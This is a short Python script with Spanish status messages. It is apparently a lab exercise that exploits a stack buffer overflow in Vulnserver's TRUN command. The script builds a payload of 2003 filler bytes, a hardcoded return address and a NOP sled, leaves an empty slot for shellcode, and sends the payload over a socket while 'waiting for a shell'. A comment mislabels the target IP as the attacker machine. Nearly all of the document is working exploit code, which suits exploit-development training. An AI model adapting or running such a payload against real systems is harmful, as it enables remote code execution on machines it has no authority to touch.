#!/usr/bin/python3
import sys
import socket

ip = "192.168.0.39" # CHANGE THIS - put your attacker machine IP here
port = 9999

overflow = (
                    # Put the value here
).encode('latin-1')


shellcode = b"C" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    print("[*] Conectado al servidor")
    banner = sock.recv(1024)
    print(f"[*] Banner: {banner.decode()}")
    sock.send(b'TRUN /.:/' + shellcode)
    print("[*] Payload enviado - esperando shell...")
    sock.close()
except ConnectionRefusedError:
    print("[-] Conexión rechazada - verifica que Vulnserver esté corriendo")
except socket.timeout:
    print("[-] Timeout")
except Exception as e:
    print(f"[-] Error: Unable to establish connection with Server - {e}")
    sys.exit()


